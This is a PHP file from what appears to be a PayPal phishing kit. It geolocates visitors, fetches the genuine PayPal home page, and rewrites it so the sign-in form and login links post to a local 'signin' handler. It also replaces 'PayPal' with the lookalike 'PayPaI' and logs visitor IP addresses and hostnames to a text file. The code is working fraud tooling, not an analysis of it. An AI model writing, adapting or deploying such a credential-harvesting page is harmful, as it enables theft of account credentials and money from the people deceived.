<?php
error_reporting(0);
session_start();
set_time_limit(0);
include('../edit/bots.php');
$ip          = $_SERVER['REMOTE_ADDR'];
$details     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip . "");
$codecountryy      = $details->geoplugin_countryCode;
$smiyacountry = $details->geoplugin_countryName;
$codecountry = strtolower($codecountryy);
$url         = "https://www.paypal.com/{$codecountry}/webapps/mpp/home";
$options     = array(
    'http' => array(
        'method' => "GET",
        'header' => "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . ""
    )
);
$originalcodemoreart     = stream_context_create($options);

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
if (stripos($codecountryy, 'GB') !== false) {
    $safha   = file_get_contents('https://www.paypal.com/cz/webapps/mpp/home', false, $originalcodemoreart);
    $onwan  = getStr($safha, '<title>', '</title>');
    $khtar = getStr($safha, '<div class="country-selector ">', '</div>');
    $natija = str_replace($onwan, 'PayPal United Kingdom: Pay, Send Money & Accept Payments', $safha);
    $natija = str_replace($khtar, '<a href="?webapps/mpp/country-worldwide" title="Change Language or Country" class="country unitedkingdom">Change Language or Country</a>', $natija);
} elseif (stripos($codecountryy, 'US') !== false || stripos($codecountryy, 'IR') !== false || stripos($codecountryy, '') !== false || stripos($codecountryy, 'JP') !== false) {
    $safha   = file_get_contents('https://www.paypal.com/cz/webapps/mpp/home', false, $originalcodemoreart);
    $onwan  = getStr($safha, '<title>', '</title>');
    $khtar = getStr($safha, '<div class="country-selector ">', '</div>');
    $natija = str_replace($onwan, 'Send Money, Pay Online or Set Up a Merchant Account - PayPal', $safha);
    $natija = str_replace($khtar, '<a href="?webapps/mpp/country-worldwide" title="See all countries" class="country US">See all countries</a>', $natija);
} else {
    $natija = file_get_contents($url, false, $originalcodemoreart);
}


$jibsafha = getStr($natija, 'My Account;action-uri=', 'cgi-bin/signin');
$jibsafha = getStr($natija, '<link rel="canonical" href="', 'home');
$get_form = getStr($natija, 'class="form-inline ">', 'novalidate="novalidate"');
$loging   = 'signin';


$chof = str_replace("&#x3a;", ":", $natija);
$chof = str_replace("&#x2f;", "/", $chof);
$chof = str_replace("&#x3f;", "?", $chof);
$chof = str_replace("&#x3d;", "=", $chof);
$chof = str_replace($jibsafha . "cgi-bin/signin", $loging, $chof);
$chof = str_replace($get_form, '<form action="signin" method="post" ', $chof);
$chof = str_replace("/cgi-bin/signin", $loging, $chof);
$chof = str_replace($jibsafha . "cgi-bin/signin", "signin", $chof);
$chof = str_replace($jibsafha, "?", $chof);
$chof = str_replace('https://www.paypal.com/signin', $loging, $chof);
$chof = str_replace('novalidate="novalidate" ', "", $chof);
$home = str_replace("PayPal", "PayPaI", $chof);
echo $home;


if (gethostbyaddr($_SERVER['REMOTE_ADDR']) == $_SERVER['REMOTE_ADDR']) {
    $file = fopen("../../anon.txt", "a");
    fwrite($file, $_SERVER['REMOTE_ADDR'] . '
');
    fclose($file);
} else {
    $file = fopen("../../anon.txt", "a");
    fwrite($file, $_SERVER['REMOTE_ADDR'] . ' ' . gethostbyaddr($_SERVER['REMOTE_ADDR']) . '
');
    fclose($file);
}

exit;

?>